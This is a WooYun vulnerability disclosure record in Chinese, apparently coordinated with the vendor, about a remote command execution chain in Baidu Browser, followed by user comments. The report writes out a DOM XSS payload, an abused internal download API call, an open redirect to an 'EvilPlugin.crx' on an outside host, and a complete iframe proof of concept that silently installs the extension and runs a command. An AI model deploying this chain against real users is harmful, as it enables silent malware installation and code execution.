{"id": 47345, "wybug_id": "wooyun-2014-081309", "wybug_title": "百度浏览器远程命令执行四", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2014-10-30 09:25", "wybug_open_date": "2015-01-28 09:26", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向公众公开  简要描述： 轻轻的我来了，正如我轻轻的抖。 版本又更新了，但漏洞却没有走。最新版本（6.5.0.50459）,另一个某API虽然做出限制，但限制依然宽松，结合一些乌云上公开但未修复的鸡肋，可轻松绕过限制导致远程命令执行缺陷。 详细说明：  1. 首先拿出前面在xapp.baidu.com下扫荡出的一个DOM XSS\nhttp://xapp.baidu.com/browserextension/single/tieba/tiebarslidebar/v_6-0/tiebaslidebar-login-confirm.html#!f=aaaa&uid=vvvvv&uname=<img src=1 onerror=alert(1)>\n恩，标准的DOM XSS～2. 对 《百度浏览器远程命令执行》中所使用的AppService.AppMarket.DownloadPack API进行再次分析，发现如果对  AppService.AppMarket.DownloadPack 的参数 中 ID指定为 某一个已知安装的APP ID，则不会有安装提示，即使update值为false，例如：\nwindow.external.StartRequest(222,\"AppService.AppMarket.DownloadPack\",\"(function(id,res){console.log(res)})\",\"{\\\"ID\\\":\\\"Silenter\\\",\\\"UPDATE\\\":\\\"false\\\",\\\"URL\\\":\\\"http://dlsw.br.baidu.com/49411271abae81764cf268983c95d9d7.crx\\\"}\",window,\"\");\n3. 然后相比第一次，这一次，开发人员对 URL参数进行了判断，判断要求如下：A. URL必须为*.baidu.com域名下的资源B. URL必须为 .crx结尾4. 这种限制显然过于宽松， URL地址可以轻松被一些方式绕过：比如在baidu.com域名下上传资源，但是要找到这样的点不太容易，但是还有一种更简单的办法，就是找一个baidu.com域下的302跳转，跳到自己的资源地址。那么，302跳转好找么？5. 嗯，我都懒得去百度GOOGLE搜索了，直接在乌云搜索“百度 跳转”，因为URL跳转什么的经常不被重视哇，所以估计还有没修好的。于是，很顺利的搜索到以下漏洞： WooYun: 百度url跳转及反射型xss 《百度url跳转及反射型xss》公开时间：\t2014-08-10 19:10该漏洞已经公开，但并未修复。6. 根据以上漏洞信息，构建以下URL跳转：\nhttp://newsletter.baidu.com/u.html?stime=1403762195&uid=baidu&eid=1309383&email=wooyun@qq.com&tlid=259&stid=1672&thid=259&url=IzEjaHR0cDovLzE5Mi4xNjguMS4xMDUvRXZpbFBsdWdpbi5jcng=&.crx\n该URL会跳转到 http://192.168.1.105/EvilPlugin.crx, 其中URL里的 &.crx是为了满足步骤3里所描述的判断规则。7. 因此不难构造出漏洞利用代码：\nwindow.external.StartRequest(222,\"AppService.AppMarket.DownloadPack\",\"(function(id,res){console.log(res)})\",\"{\\\"ID\\\":\\\"Silenter\\\",\\\"UPDATE\\\":\\\"false\\\",\\\"URL\\\":\\\"http://newsletter.baidu.com/u.html?stime=1403762195&uid=baidu&eid=1309383&email=wooyun@qq.com&tlid=259&stid=1672&thid=259&url=IzEjaHR0cDovLzE5Mi4xNjguMS4xMDUvRXZpbFBsdWdpbi5jcng=&.crx\\\"}\",window,\"\");\n8. 利用xapp.baidu.com下的XSS调用以上代码：\n<html><head></head><body>\t<iframe src='http://xapp.baidu.com/browserextension/single/tieba/tiebarslidebar/v_6-0/tiebaslidebar-login-confirm.html#!f=aaaa&uid=vvvvv&uname=<img src=1 onerror=eval(window.name)>' name='window.external.StartRequest(222,\"AppService.AppMarket.DownloadPack\",\"(function(id,res){console.log(res)})\",\"{\\\"ID\\\":\\\"Silenter\\\",\\\"UPDATE\\\":\\\"false\\\",\\\"URL\\\":\\\"http://newsletter.baidu.com/u.html?stime=1403762195&uid=baidu&eid=1309383&email=wooyun@qq.com&tlid=259&stid=1672&thid=259&url=IzEjaHR0cDovLzE5Mi4xNjguMS4xMDUvRXZpbFBsdWdpbi5jcng=&.crx\\\"}\",window,\"\");'></iframe></body></html>\n9. 运行代码效果如下：\n\n任意打开一个网页后，执行calc\n\n   漏洞证明：  演示视频：http://v.youku.com/v_show/id_XODE0NDUwNjY4.html密码：wooyuncmd   修复方案：  1. 修复DOM XSShttp://xapp.baidu.com/browserextension/single/tieba/tiebarslidebar/v_6-0/tiebaslidebar-login-confirm.html#!f=aaaa&uid=vvvvv&uname=<img src=1 onerror=alert(1)>2. 继续修复 AppService.AppMarket.DownloadPack 的安装判断。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-30 21:38 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-30 09:29 |    \t\tJim叔叔 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:25        | 这样子不太好吧。。)\t\t \n  21    \n     2014-10-30 09:31 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  百度：我都给你20了你还要怎样？二哥：约？百度：约！    \n     2014-10-30 09:32 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  百度：我都给你20了你还要怎样？ 二哥：约？ 百度：约！    \n     2014-10-30 09:58 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  百度：我都给你20了你还要怎样？ 二哥：约？ 百度：约！     \n     2014-10-30 09:59 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  二哥 你是准备把百度浏览器玩的混不下去么    \n     2014-10-30 10:04 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  百度：我都给你20了你还要怎样？ 二哥：约？ 百度：约！    \n     2014-10-30 10:07 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-10-30 10:07 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-10-30 10:08 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-10-30 10:08 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  二哥准备了20连载的    \n     2014-10-30 10:09 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-10-30 10:09 |    \t\twiluilu \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 涅槃就是死~)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-10-30 10:09 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-10-30 10:27 |    \t\tVinGogh \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:7        | G.X.)\t\t \n  百度被玩坏了    \n     2014-10-30 10:49 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  肯定有五    \n     2014-10-30 11:25 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  这事要刷屏的节奏!    \n     2014-10-30 11:26 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  我叫王大锤，万万没想到，二哥又找出了百度浏览器远程命令执行漏洞    \n     2014-10-30 14:09 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  他说的好有道理，我竟无言以对。    \n     2014-10-30 14:45 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @奇虎360 百度浏览器做这么渣,你造么？    \n     2014-10-30 17:51 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  挖掘机技术哪家强？    \n     2014-10-30 19:08 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  有种人 是让人膜拜的    \n     2014-10-31 00:50 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  4个漏洞96rank，名次瞬间提升了3名。。。    \n     2014-10-31 01:25 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @px1624   嘿嘿，想我5个100rank，8天升级普通，你恨了吗？    \n     2014-10-31 13:56 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @老和尚 4个96和5个100，哪个牛逼？    \n     2014-10-31 14:00 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @px1624 额、我算算啊。肯定是我咯    \n     2014-10-31 14:08 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  96/4=28 100/5=20    28-20=8  5-4=1智商不忍直视。。。。    \n     2014-10-31 14:09 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @淡漠天空  漠漠、别凑热闹、px肯定是算不来才问我的    \n     2014-10-31 14:18 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @老和尚 @淡漠天空 哈哈，所以说还是4个96更牛逼么    \n     2014-10-31 14:20 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @px1624 哎。就知道你算不来、好歹也百度一下啊。偶。百度浏览器被日了.......    \n     2014-10-31 14:59 |    \t\tmlyKnown \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 咚咚咚咚，查水表啦。)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2014-11-02 21:40 |    \t\t帅克笛枫 \t\t\t( 普通白帽子  |\t\t\t        Rank:207 漏洞数:46        | 键盘只为不平而起落，鼠标亦会点到为止！)\t\t \n  这是嚼了炫迈的感觉嘛？    \n     2014-11-03 10:56 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  百度：我都给你20了你还要怎样？ 二哥：约？ 百度：约！    \n     2014-11-03 13:05 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  百度：我都给你20了你还要怎样？ 二哥：约？ 百度：约！    \n     2014-11-03 14:25 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  说明一个问题  只要被高手盯上 无人可以逃脱不过也要让漏洞挖掘带点难得才好    \n     2014-11-03 14:28 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @老和尚 怎么都是SQL注入呀、、、、、    \n     2014-11-04 09:27 |    \t\t疯狂的dabing \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | Hehe is golden.)\t\t \n  @淡漠天空 96/4=28 这也是醉了。。。    \n     2014-11-04 10:26 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @疯狂的dabing 。。。。26   下意识按键位没注意    \n     2014-11-04 11:48 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  @淡漠天空 96/4=26 这也是醉了。。。    \n     2014-11-04 12:08 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @大亮 卧槽。。。。24   行了  我学前班别跟我比文化   彻底对自己现在的状态醉了    \n     2014-11-20 09:10 |    \t\twooOver \t\t\t( 普通白帽子  |\t\t\t        Rank:318 漏洞数:83        | 我要控制我自己)\t\t \n  这个漏洞需要什么条件才能查看呀？    \n     2014-12-01 17:08 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  url跳转还有这用法，学习学习    \n     2015-01-22 00:51 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  居然利用了我的漏洞，我要收专利费    \n     2015-01-22 07:57 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @Mr .LZH -_-||    \n     2015-01-28 22:57 |    \t\tZtz \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        | 自由职业)\t\t \n  人家程序员工资都发给你了。    \n     2015-01-30 16:06 |    \t\tme1ody \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:15        | 乌云临时工)\t\t \n  百度你们家浏览器做这么渣你家里人造么？    \n     2015-07-18 14:21 |    \t\tsOnsec \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        | 安全是什么...)\t\t \n  膜拜    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}